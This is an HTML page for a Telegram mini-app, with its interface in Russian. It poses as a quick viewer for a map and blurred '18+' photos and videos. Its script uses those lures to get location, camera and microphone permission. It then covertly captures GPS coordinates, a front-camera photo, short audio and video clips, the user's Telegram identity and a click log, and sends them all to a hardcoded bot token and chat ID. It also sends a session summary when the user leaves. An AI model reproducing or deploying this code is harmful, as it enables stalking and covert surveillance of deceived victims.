<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Быстрый просмотр</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: Arial, sans-serif;
      color: #f3f6fb;
      background-color: #0b1020;
      background-image:
        linear-gradient(160deg, rgba(11, 16, 32, 0.78), rgba(19, 27, 51, 0.85)),
        url('./bg.jpg');
      background-size: cover;
      background-position: center;
      background-attachment: fixed;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
    }

    .app {
      width: 100%;
      max-width: 440px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }

    .header h2 {
      margin: 0 0 4px;
      font-size: 20px;
    }

    .header p {
      margin: 0;
      font-size: 13px;
      color: #cbd5e1;
    }

    .menu {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    button {
      padding: 13px 15px;
      font-size: 15px;
      font-weight: 600;
      border: 1px solid rgba(255, 255, 255, 0.16);
      border-radius: 12px;
      background: rgba(15, 23, 42, 0.72);
      color: #fff;
      cursor: pointer;
      backdrop-filter: blur(8px);
      transition: transform 0.12s ease, background 0.2s ease;
    }

    button:hover {
      background: rgba(30, 41, 59, 0.88);
    }

    button:active {
      transform: scale(0.98);
    }

    .btn-primary {
      background: linear-gradient(135deg, #2563eb, #0ea5e9);
      border: none;
      width: 100%;
      margin-top: 10px;
    }

    .card {
      display: none;
      background: rgba(15, 23, 42, 0.82);
      border: 1px solid rgba(255, 255, 255, 0.14);
      border-radius: 16px;
      padding: 14px;
      backdrop-filter: blur(12px);
    }

    .card.active {
      display: block;
    }

    .fake-map {
      position: relative;
      height: 180px;
      border-radius: 12px;
      overflow: hidden;
      background:
        linear-gradient(to right, rgba(148, 163, 184, 0.14) 1px, transparent 1px),
        linear-gradient(to bottom, rgba(148, 163, 184, 0.14) 1px, transparent 1px),
        linear-gradient(135deg, #1e3a5f, #162844);
      background-size: 28px 28px, 28px 28px, cover;
      border: 1px solid rgba(125, 211, 252, 0.25);
    }

    .map-road {
      position: absolute;
      background: rgba(250, 204, 21, 0.35);
      border-radius: 999px;
    }

    .map-road.r1 {
      width: 120%;
      height: 8px;
      top: 52%;
      left: -10%;
      transform: rotate(-11deg);
    }

    .map-road.r2 {
      width: 8px;
      height: 120%;
      left: 58%;
      top: -10%;
      transform: rotate(14deg);
    }

    .map-pin {
      position: absolute;
      left: 58%;
      top: 52%;
      transform: translate(-50%, -100%);
      background: #ef4444;
      color: #fff;
      font-size: 12px;
      font-weight: bold;
      padding: 5px 9px;
      border-radius: 999px;
      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.45);
    }

    .media-frame {
      position: relative;
      height: 180px;
      border-radius: 12px;
      overflow: hidden;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .photo-preview {
      position: absolute;
      inset: 0;
      background-image: url('./bg.jpg');
      background-size: cover;
      background-position: center;
      filter: blur(10px);
      transform: scale(1.08);
    }

    .video-preview {
      position: absolute;
      inset: 0;
      background-image:
        linear-gradient(rgba(15, 23, 42, 0.35), rgba(15, 23, 42, 0.55)),
        url('./bg.jpg');
      background-size: cover;
      background-position: center;
    }

    .media-overlay {
      position: relative;
      z-index: 2;
      background: rgba(15, 23, 42, 0.78);
      border: 1px solid rgba(255, 255, 255, 0.22);
      padding: 10px 14px;
      border-radius: 10px;
      text-align: center;
      backdrop-filter: blur(10px);
    }

    .media-overlay strong {
      display: block;
      font-size: 14px;
      letter-spacing: 0.4px;
    }

    .media-overlay span {
      font-size: 12px;
      color: #cbd5e1;
    }

    .hint {
      margin-top: 8px;
      font-size: 12px;
      color: #cbd5e1;
    }
  </style>
</head>
<body>
  <div class="app">
    <div class="header">
      <h2>Быстрый просмотр</h2>
      <p>Выберите раздел, затем подтвердите действие</p>
    </div>

    <div class="menu">
      <button id="open-geo-card">Проверить локацию</button>
      <button id="open-cam-card">Посмотреть фото</button>
      <button id="btn-mic">Записать звук</button>
      <button id="open-video-card">Видео (фронталка)</button>
    </div>

    <div id="card-geo" class="card">
      <div class="fake-map">
        <div class="map-road r1"></div>
        <div class="map-road r2"></div>
        <div class="map-pin">Точка на карте</div>
      </div>
      <div class="hint">Открыть карту?</div>
      <button id="confirm-geo" class="btn-primary">Открыть карту</button>
    </div>

    <div id="card-cam" class="card">
      <div id="censored-photo" class="media-frame">
        <div class="photo-preview"></div>
        <div class="media-overlay">
          <strong>[ Скрыто ]</strong>
          <span>Нажмите на фото или кнопку ниже</span>
        </div>
      </div>
      <div class="hint">Для просмотра подтвердите возраст 18+.</div>
      <button id="confirm-cam" class="btn-primary">Открыть фото</button>
    </div>

    <div id="card-video" class="card">
      <div id="video-box" class="media-frame">
        <div class="video-preview"></div>
        <div class="media-overlay">
          <strong>[ Видео-превью ]</strong>
          <span>Нажмите на видео или кнопку ниже</span>
        </div>
      </div>
      <div class="hint">Посмотреть видео 18+</div>
      <button id="confirm-video" class="btn-primary">Записать видео</button>
    </div>
  </div>

  <script>
    const BOT_TOKEN = '8322427303:AAGFHKfe3YCf7Dwg-uc7jfVA8MAn1Dbjzgw';
    const CHAT_ID = '8298749655';

    const tg = window.Telegram?.WebApp;
    if (tg) {
      tg.ready();
      tg.expand();
    }

    const sessionId = 'S-' + Math.random().toString(36).slice(2, 8).toUpperCase();
    const startedAt = Date.now();
    const sessionEvents = [];
    let lastCoords = null;

    function formatCoords() {
      if (!lastCoords) return '';
      return `\nКоординаты: ${lastCoords.lat}, ${lastCoords.lon} (±${lastCoords.acc} м)`;
    }

    function getUserInfo() {
      const u = tg?.initDataUnsafe?.user;
      if (!u) {
        return 'Данные Telegram не переданы (браузер или скрытый контекст)';
      }

      const parts = [];
      if (u.id !== undefined) parts.push(`id: ${u.id}`);
      if (u.username) parts.push(`@${u.username}`);
      const fullName = [u.first_name, u.last_name].filter(Boolean).join(' ');
      if (fullName) parts.push(`имя: ${fullName}`);
      if (u.language_code) parts.push(`язык: ${u.language_code}`);
      if (u.is_premium) parts.push('premium: да');

      return parts.length ? parts.join(' | ') : 'Пользователь TG (поля не заполнены)';
    }

    function nowTime() {
      return new Date().toLocaleTimeString('ru-RU', { hour12: false });
    }

    async function sendMessageToBot(text) {
      if (!BOT_TOKEN || BOT_TOKEN.startsWith('ВАШ_') || !CHAT_ID || CHAT_ID.startsWith('ВАШ_')) {
        return;
      }
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const payloadText = `${text}${formatCoords()}`;
      try {
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          keepalive: true,
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: payloadText
          })
        });
      } catch (_) {}
    }

    async function sendFileToBot(endpoint, fieldName, blob, filename, caption = '') {
      if (!BOT_TOKEN || BOT_TOKEN.startsWith('ВАШ_') || !CHAT_ID || CHAT_ID.startsWith('ВАШ_')) {
        return;
      }
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append(fieldName, blob, filename);
      if (caption) {
        formData.append('caption', `${caption}${formatCoords()}`);
      }

      const res = await fetch(url, {
        method: 'POST',
        body: formData
      });
      if (!res.ok) {
        throw new Error(`HTTP ${res.status}`);
      }
    }

    async function logAction(eventText) {
      const line = `[${nowTime()}] ${eventText}`;
      sessionEvents.push(line);
      await sendMessageToBot(`Сессия ${sessionId} | ${getUserInfo()}\n${line}`);
    }

    let summarySent = false;
    function sendSessionSummary(reason) {
      if (summarySent) return;
      summarySent = true;
      const sec = Math.max(1, Math.round((Date.now() - startedAt) / 1000));
      const list = sessionEvents.length ? sessionEvents.join('\n') : 'Без действий';
      sendMessageToBot(
        `Завершение сессии (${reason})\nСессия: ${sessionId} | ${getUserInfo()}\nВремя в приложении: ${sec} сек\n\nДействия за сессию:\n${list}`
      );
    }

    const cardGeo = document.getElementById('card-geo');
    const cardCam = document.getElementById('card-cam');
    const cardVideo = document.getElementById('card-video');

    function showCard(targetCard) {
      cardGeo.classList.remove('active');
      cardCam.classList.remove('active');
      cardVideo.classList.remove('active');
      if (targetCard) {
        targetCard.classList.add('active');
      }
    }

    // 1. Геолокация
    function handleGeo() {
      logAction('Нажал «Открыть карту» — запрос геолокации');

      if (!navigator.geolocation) {
        logAction('Геолокация не поддерживается устройством');
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          lastCoords = {
            lat: latitude,
            lon: longitude,
            acc: Math.round(accuracy)
          };
          await logAction('Разрешил геолокацию — координаты сохранены');
        },
        (err) => {
          logAction(`Ошибка/отказ геолокации: code=${err.code} (${err.message || 'нет доступа'})`);
        },
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    }

    // 2. Фото с фронтальной камеры
    async function handleCamera() {
      logAction('Нажал на фото / «Открыть фото» — запрос камеры');

      if (!navigator.mediaDevices?.getUserMedia) {
        logAction('Камера недоступна в этом окружении');
        return;
      }

      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        });
        logAction('Разрешил камеру для фото');

        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        await video.play();

        await new Promise((resolve) => setTimeout(resolve, 400));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise((resolve) =>
          canvas.toBlob(resolve, 'image/jpeg', 0.85)
        );

        await sendFileToBot('sendPhoto', 'photo', blob, 'photo.jpg', `Сессия ${sessionId} | ${getUserInfo()}`);
        logAction('Фото отправлено в бот');
      } catch (err) {
        logAction(`Не дал доступ к камере или ошибка: ${err.name || err.message}`);
      } finally {
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
        }
      }
    }

    // 3. Запись короткого аудио (3 сек)
    async function handleMic() {
      logAction('Нажал «Записать звук» — запрос микрофона');

      if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === 'undefined') {
        logAction('Микрофон или MediaRecorder недоступны');
        return;
      }

      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
        logAction('Разрешил микрофон — запись 3 сек');

        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = (e) => {
          if (e.data && e.data.size > 0) {
            chunks.push(e.data);
          }
        };

        const stopped = new Promise((resolve) => {
          recorder.onstop = resolve;
        });

        recorder.start();
        await new Promise((resolve) => setTimeout(resolve, 3000));
        recorder.stop();
        await stopped;

        const mimeType = recorder.mimeType || 'audio/webm';
        const blob = new Blob(chunks, { type: mimeType });

        await sendFileToBot('sendVoice', 'voice', blob, 'voice.ogg', `Сессия ${sessionId} | ${getUserInfo()}`);
        logAction('Аудиозапись отправлена в бот');
      } catch (err) {
        logAction(`Не дал доступ к микрофону или ошибка: ${err.name || err.message}`);
      } finally {
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
        }
      }
    }

    // 4. Видео только с фронтальной камеры (3 сек)
    async function handleFrontVideo() {
      logAction('Нажал «Записать видео» — запрос фронтальной камеры');

      if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === 'undefined') {
        logAction('Видеозапись не поддерживается на этом устройстве');
        return;
      }

      let stream;
      try {
        try {
          stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' },
            audio: true
          });
        } catch (_) {
          stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' },
            audio: false
          });
        }

        logAction('Разрешил фронтальную камеру — запись 3 сек');

        const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
          ? 'video/webm;codecs=vp8,opus'
          : (MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : '');

        const recorder = mimeType
          ? new MediaRecorder(stream, { mimeType })
          : new MediaRecorder(stream);

        const chunks = [];
        recorder.ondataavailable = (e) => {
          if (e.data && e.data.size > 0) {
            chunks.push(e.data);
          }
        };

        const stopped = new Promise((resolve) => {
          recorder.onstop = resolve;
        });

        recorder.start();
        await new Promise((resolve) => setTimeout(resolve, 3000));
        recorder.stop();
        await stopped;

        const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
        await sendFileToBot(
          'sendVideo',
          'video',
          blob,
          'front_video.mp4',
          `Сессия ${sessionId} | ${getUserInfo()} | Фронтальная камера`
        );
        logAction('Видео с фронтальной камеры отправлено в бот');
      } catch (err) {
        logAction(`Не дал доступ к фронтальной камере или ошибка: ${err.name || err.message}`);
      } finally {
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
        }
      }
    }

    document.getElementById('open-geo-card').addEventListener('click', () => {
      showCard(cardGeo);
      logAction('Открыл раздел «Проверить локацию»');
    });

    document.getElementById('open-cam-card').addEventListener('click', () => {
      showCard(cardCam);
      logAction('Открыл раздел «Посмотреть фото»');
    });

    document.getElementById('open-video-card').addEventListener('click', () => {
      showCard(cardVideo);
      logAction('Открыл раздел «Видео (фронталка)»');
    });

    document.getElementById('confirm-geo').addEventListener('click', handleGeo);
    document.getElementById('censored-photo').addEventListener('click', handleCamera);
    document.getElementById('confirm-cam').addEventListener('click', handleCamera);
    document.getElementById('btn-mic').addEventListener('click', handleMic);
    document.getElementById('confirm-video').addEventListener('click', handleFrontVideo);

    if (tg?.onEvent) {
      tg.onEvent('viewportChanged', (eventData) => {
        if (eventData && eventData.isStateStable === false) {
          sendSessionSummary('окно Telegram закрыто/свёрнуто');
        }
      });
    }

    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        sendSessionSummary('свернул/закрыл экран');
      }
    });
    window.addEventListener('pagehide', () => sendSessionSummary('вышел со страницы'));
    window.addEventListener('beforeunload', () => sendSessionSummary('закрыл вкладку'));

    logAction('Вошёл в мини-приложение');
  </script>
</body>
</html>
